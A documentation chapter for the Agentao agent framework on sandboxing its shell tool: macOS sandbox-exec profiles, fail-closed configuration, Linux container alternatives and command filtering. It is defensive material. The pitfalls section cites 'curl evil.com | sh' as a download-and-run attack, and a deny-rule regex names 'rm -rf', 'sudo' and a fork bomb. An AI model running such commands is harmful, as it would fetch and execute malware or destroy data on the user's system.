# 6.2 Shell Sandbox & Command Control

> **What you'll learn**
> - The three progressive defenses for shell: PermissionEngine, `confirm_tool`, kernel sandbox
> - The three macOS sandbox profiles (`readonly` / `workspace-write` / `workspace-write-no-network`)
> - Linux equivalents: containers, namespaces, seccomp

`run_shell_command` is Agentao's most capable — and most dangerous — tool. Agentao provides **three progressive defenses**, ranked cheap-to-expensive:

```
Layer A · PermissionEngine   (always on)
  └─ rule-based allow / deny / ask
Layer B · confirm_tool        (interactive scenarios)
  └─ user approves / rejects
Layer C · macOS sandbox-exec  (off by default; explicit enable)
  └─ kernel-level file / network isolation
```

A and B are covered in [Part 4.5](/en/part-4/5-tool-confirmation-ui) and [Part 5.4](/en/part-5/4-permissions). This section focuses on **Layer C: system-level sandbox**.

## macOS sandbox-exec

macOS ships with `sandbox-exec`, a kernel-level isolator for file writes and network. Agentao's `SandboxPolicy` wraps shell commands with it when enabled.

### Design principles

- **Only `run_shell_command` is sandboxed.** `sandbox-exec` wraps a child process. `write_file`, `replace` and `web_fetch` run inside the agent's own process, so they cannot be wrapped. The permission engine alone controls them.
- **The sandbox is separate from the permission mode.** The engine decides *whether* a command runs. The sandbox limits *what the command can do* after the engine allowed it. You can keep the sandbox on under `/mode full-access`, where it still applies to every shell command.
- **It is off by default.** A sandbox would break workflows that need the network, such as `npm install`, `pip install` or `git clone`. Turn it on in `sandbox.json` or with `/sandbox on`.
- **It is macOS only.** On other platforms the policy is silently off. See [Cross-platform notes](#cross-platform-notes).

### How a command is wrapped

1. The tool executor asks the policy for a profile after the call was allowed ([`runtime/tool_executor.py`](https://github.com/jin-bo/agentao/blob/main/agentao/runtime/tool_executor.py)). It passes the profile to the shell tool in a private argument. The model and the plugin hooks never see that argument.
2. The shell tool rewrites the command as `/usr/bin/sandbox-exec -D _RW1=<workspace_root> -f <profile.sb> <shell> -c '<command>'` ([`tools/shell.py::_wrap_with_sandbox`](https://github.com/jin-bo/agentao/blob/main/agentao/tools/shell.py)). Background commands are wrapped the same way. The absolute path is deliberate: a sandboxed command can write a directory on `PATH` (such as `.venv/bin`), and a `sandbox-exec` placed there must not run the next command.
3. The inner `<shell>` is the same shell that runs an unsandboxed command (`resolve_shell_executable()`: bash, else `/bin/sh`). Thus a command parses the same way with and without the sandbox.

stdout, stderr and the exit code pass through unchanged.

### Three built-in profiles

| Profile | File writes | Network | Use case |
|---------|-------------|---------|----------|
| `readonly` | temp dirs only | ❌ | Pure read analysis, audits |
| `workspace-write-no-network` | `_RW1` + temp dirs | ❌ | Code editing without net (the built-in default) |
| `workspace-write` | `_RW1` + temp dirs | ✅ | Dev work that needs the network |

"Temp dirs" are `/tmp`, `/var/tmp`, their `/private/...` paths and `/private/var/folders/` (the per-user `$TMPDIR`). Every profile allows them, because many tools write scratch files there. All three profiles also read anywhere, and allow fork and exec. The files are in [`agentao/sandbox/profiles/`](https://github.com/jin-bo/agentao/tree/main/agentao/sandbox/profiles).

`_RW1` is a sandbox-profile variable for "the writable path"; Agentao passes `workspace_root` (defaults to the project root).

## Enabling it

### Minimum config

In `~/.agentao/sandbox.json`:

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network"
}
```

After restart, every `run_shell_command` runs through sandbox-exec. On non-macOS (no `sandbox-exec`), the sandbox **silently degrades to off** — a potential security risk discussed in "Cross-platform notes".

### Config fields

Agentao reads only `~/.agentao/sandbox.json`. **It ignores `<project>/.agentao/sandbox.json`**, logs a warning, and shows the ignored path in `/sandbox status` and `agentao doctor`. A file in the project can come from a cloned repository, or from a sandboxed command, which can write the whole workspace. Such a file must not switch the sandbox off or change its profile. A project `permissions.json` is ignored for the same reason.

```json
{
  "enabled": false,
  "platform": "darwin",
  "default_profile": "workspace-write-no-network",
  "rules": [],
  "profiles_dir": null,
  "workspace_root": null
}
```

| Field | Meaning |
|-------|---------|
| `enabled` | The main switch. Default `false`. |
| `platform` | Any value other than `"darwin"` turns the sandbox off. |
| `default_profile` | The profile to use when no rule matches. |
| `rules` | Per-tool overrides. The first rule whose `tool` matches wins. Only `run_shell_command` has an effect. |
| `profiles_dir` | A directory of your own `.sb` files. Agentao searches it before the built-in profiles. |
| `workspace_root` | The writable path passed as `_RW1`. Default: the project root. |

A relative `profiles_dir` or `workspace_root` in the file resolves against `~/.agentao/`. The loader is [`sandbox/policy.py::load_sandbox_config`](https://github.com/jin-bo/agentao/blob/main/agentao/sandbox/policy.py). It type-checks every field. A wrong type fails closed, like a JSON error.

### Different profiles per tool

```json
{
  "enabled": true,
  "default_profile": "workspace-write-no-network",
  "rules": [
    {"tool": "run_shell_command", "profile": "workspace-write"}
  ]
}
```

Current rule matching is by `tool` name only; future versions may route by command content.

### Runtime toggle

```python
from pathlib import Path
from agentao import Agentao
from agentao.sandbox import SandboxPolicy

policy = SandboxPolicy(project_root=Path("/data/tenant-a"))
policy.set_enabled(True)
policy.set_default_profile("workspace-write-no-network")
agent = Agentao(working_directory=Path("/data/tenant-a"), sandbox_policy=policy)
```

`set_enabled()` and `set_default_profile()` are session overrides. They are not written to `sandbox.json`. `build_from_environment()` builds a `SandboxPolicy` for the working directory unless you pass `sandbox_policy=` yourself. A bare `Agentao(...)` has no sandbox policy.

## Custom profiles

Drop `.sb` files under `profiles_dir`:

```json
{
  "enabled": true,
  "profiles_dir": "./sandbox-profiles",
  "default_profile": "my-strict"
}
```

A relative `profiles_dir` resolves against `~/.agentao/`, so this one is `~/.agentao/sandbox-profiles/`. A file with the same name as a built-in profile replaces that built-in.

Start from a copy of a built-in profile and narrow it. This skeleton has the same structure as the built-ins. `~/.agentao/sandbox-profiles/my-strict.sb`:

```scheme
(version 1)
(debug deny)
(import "system.sb")

(allow file-read*)

;; Writes: one workspace subdirectory plus the temp dirs
(allow file-write*
  (subpath (string-append (param "_RW1") "/build"))
  (subpath "/tmp")
  (subpath "/var/tmp")
  (subpath "/private/tmp")
  (subpath "/private/var/tmp")
  (literal "/dev/null")
  (regex #"^/private/var/folders/"))

(deny network*)   ;; without this line, the network is allowed

(allow process-fork)
(allow process-exec)
(allow signal (target self))
(allow mach-lookup)
(allow sysctl-read)
(allow ipc-posix-shm)
```

Keep the `(import "system.sb")` line and the process rules. Without them, the shell itself cannot start. `_RW1` is the only parameter that Agentao passes.

**Profile syntax**: TinyScheme subset. See Apple's [Sandbox documentation](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/) or `/System/Library/Sandbox/Profiles/*.sb` for examples.

## Verifying it by hand

Check a profile on macOS before you rely on it:

1. Create `~/.agentao/sandbox.json` with `{"enabled": true, "default_profile": "workspace-write-no-network"}`.
2. Run `uv run agentao` and check that `/sandbox status` shows `enabled` and the profile.
3. Ask the agent to run `echo hello > /tmp/ok.txt`. It succeeds.
4. Ask it to run `echo bad > ~/sandbox-test.txt`. It fails with `Operation not permitted`.
5. Ask it to run `curl https://example.com`. It fails, usually with `Could not resolve host`.
6. Run `/sandbox off` and repeat step 5. It succeeds.

To test a profile without the agent, run `sandbox-exec` directly:

```bash
/usr/bin/sandbox-exec -D _RW1="$PWD" -f ~/.agentao/sandbox-profiles/my-strict.sb /bin/bash -c 'touch build/x && echo ok'
```

On Linux and Windows, `uv run agentao` must start without errors, and shell commands run unwrapped.

## Fail-closed semantics

Agentao's sandbox policy is **strictly fail-closed** — misconfiguration refuses execution, never silently degrades:

| Error | Behavior |
|-------|----------|
| `~/.agentao/sandbox.json` JSON parse error or wrong field type | On macOS: every shell call fails with `SandboxMisconfiguredError`, even if the file never set `enabled`. Off macOS: sandbox not applied |
| Referenced profile name not found | Raises `SandboxMisconfiguredError`; command refuses |
| `/usr/bin/sandbox-exec` missing (macOS) | `/sandbox status` reports it. The wrapped command fails. It never runs unwrapped |
| Profile syntax error (Scheme) | `/sandbox status`, `/sandbox on` and `/sandbox profile <name>` load the profile with `sandbox-exec` and report the error (`health_error()` / `profile_health_error()`). Nothing checks it at construction. At call time, `sandbox-exec` exits non-zero and the model sees its error |

**Meaning**: with `enabled=true`, any misconfig **fully disables** the shell tool — intentional, better than silently stripping protection. `/sandbox off` always works as the escape hatch, also when the config is broken.

## When the sandbox denies a command

A denied operation does not crash the agent. The command fails, and the model gets its output as usual. If the output contains `Operation not permitted`, `deny file-write` or `deny network`, the shell tool appends a hint ([`tools/shell.py::_annotate_sandbox_denial`](https://github.com/jin-bo/agentao/blob/main/agentao/tools/shell.py)):

```
[Sandbox hint] The command ran under macOS sandbox profile 'workspace-write-no-network'.
If the failure looks like a capability denial (file-write outside workspace, network
access, etc.) rather than a real command error, ask the user to run `/sandbox off` or
switch profile via `/sandbox profile <name>`.
```

Thus the model can ask the user to relax the sandbox, and does not debug the command. Not every `Operation not permitted` comes from the sandbox, so the text is a hint, not a verdict. A blocked network call often shows only as a DNS error: `Could not resolve host` (curl, git), `getaddrinfo ENOTFOUND` (Node) or `nodename nor servname provided` (Python). An ordinary DNS failure looks the same, so these get the hint only when the profile blocks the network: a `(deny network…)` rule, or `(deny default)` with no `(allow network…)` rule. Of the built-in profiles, that is `readonly` and `workspace-write-no-network`.

## Limits of sandbox-exec

- **No per-domain network rules.** The network is all or nothing. For domain-level control, use `web_fetch` and the permission engine rules ([6.3](./3-network-ssrf)).
- **File descriptors opened before the sandbox stay usable.** Do not open files outside the sandbox and pass them to the child.
- **SIP and TCC are separate layers.** `sandbox-exec` does not bypass them, and they do not bypass it.
- **The overhead is small**, about 1–2%.
- **`sandbox-exec` is deprecated** since macOS 10.12, but it still works on current macOS. Other tools, such as Bazel, also use it.

## Cross-platform notes

| OS | sandbox-exec available | Suggestion |
|----|------------------------|------------|
| macOS 13+ | ✅ | Use directly |
| Linux | ❌ | Use container / namespaces / seccomp (below) |
| Windows | ❌ | WSL2 / Docker Desktop |

Linux has **no built-in equivalent**. Alternatives:

**Approach 1 · Container isolation**

Run the entire agent in Docker with a read-only root + volume allowlist:

```bash
docker run --rm \
  --read-only \
  --tmpfs /tmp \
  -v $(pwd):/workspace \
  --network=none \
  -e OPENAI_API_KEY=$OPENAI_API_KEY \
  your-agent-image
```

**Approach 2 · firejail / bwrap**

Wrap `run_shell_command` in a lightweight sandbox. Not built in — customize `ShellTool`:

```python
from agentao.tools.shell import ShellTool
import shlex

class FirejailShellTool(ShellTool):
    def execute(self, command: str, **kw) -> str:
        wrapped = ["firejail", "--private=/tmp/sb", "--"] + shlex.split(command)
        return super().execute(
            command=" ".join(shlex.quote(a) for a in wrapped), **kw
        )
```

**Approach 3 · Cloud-platform isolation**

Run the agent in gVisor / Kata Containers / AWS Lambda — stronger-isolation environments.

## When is the sandbox worth enabling?

| Scenario | Enable? |
|----------|---------|
| Developer using Agentao CLI locally | Optional (enable for safety) |
| Embedded in your personal SaaS (single tenant) | **Yes** |
| Multi-tenant SaaS (high risk) | **Yes + container isolation, belt + suspenders** |
| Trusted internal tool | Optional |
| CI with an LLM | **Must** (CI shouldn't run arbitrary commands anyway) |

## Beyond the sandbox: command filtering

Even with sandbox on, always filter command strings at the permission layer first:

```json
{
  "rules": [
    {"tool": "run_shell_command", "args": {"command": "rm\\s+-rf|sudo|:\\(\\)\\{.*:|;.*:&"}, "action": "deny"},
    {"tool": "run_shell_command", "args": {"command": "^(git|ls|cat|grep) "}, "action": "allow"},
    {"tool": "run_shell_command", "action": "ask"}
  ]
}
```

Sandbox stops "kernel-level damage from the command"; permissions stop "the command shouldn't run at all". Layer both.

## ⚠️ Common pitfalls

::: warning Don't ship without these
- ❌ **Only sandboxing, no rule filtering** — `sandbox-exec` denies *after* the LLM decided to run the command; PermissionEngine should reject earlier
- ❌ **Not validating custom profiles** — a typo in an `.sb` file makes every shell command fail
- ❌ **`_RW1` points to the wrong place** — sandbox writes only allowed under `_RW1`; if it's not your `workspace_root`, nothing is writable

Each pitfall below has the full fix.
:::

### ❌ Only sandboxing, no rule filtering

Sandbox blocks `rm -rf /`, but it does **not** block `curl evil.com | sh` that downloads malware into the workspace and runs it. Rules stop that.

### ❌ Not validating custom profiles

Ship an untested profile → a single TinyScheme syntax error breaks every command. Always health-check before deploying, or switch to it with `/sandbox profile my-strict`, which runs the same check:

```python
policy = SandboxPolicy(project_root=Path.cwd())
err = policy.profile_health_error("my-strict")
assert err is None, f"Profile broken: {err}"
```

### ❌ `_RW1` points to the wrong place

Sandbox only allows writes under `_RW1`. If you expect the agent to write `/tmp/output`, either allow it in the profile or change `workspace_root`. Default: `workspace_root = project root`.

## TL;DR

- **Three layers, in order**: PermissionEngine (always on) → `confirm_tool` (interactive) → macOS `sandbox-exec` (kernel-level, opt-in).
- Profiles: `readonly` (audit), `workspace-write` (dev work that needs the network), `workspace-write-no-network` (the built-in default, also for CI / batch).
- macOS-only: Linux production should use containers + seccomp + user namespaces. The PermissionEngine + `confirm_tool` layers still apply.
- Mount sandbox config read-only in containers — the agent must not be able to relax its own profile.

→ [6.3 Network & SSRF Defense](./3-network-ssrf)
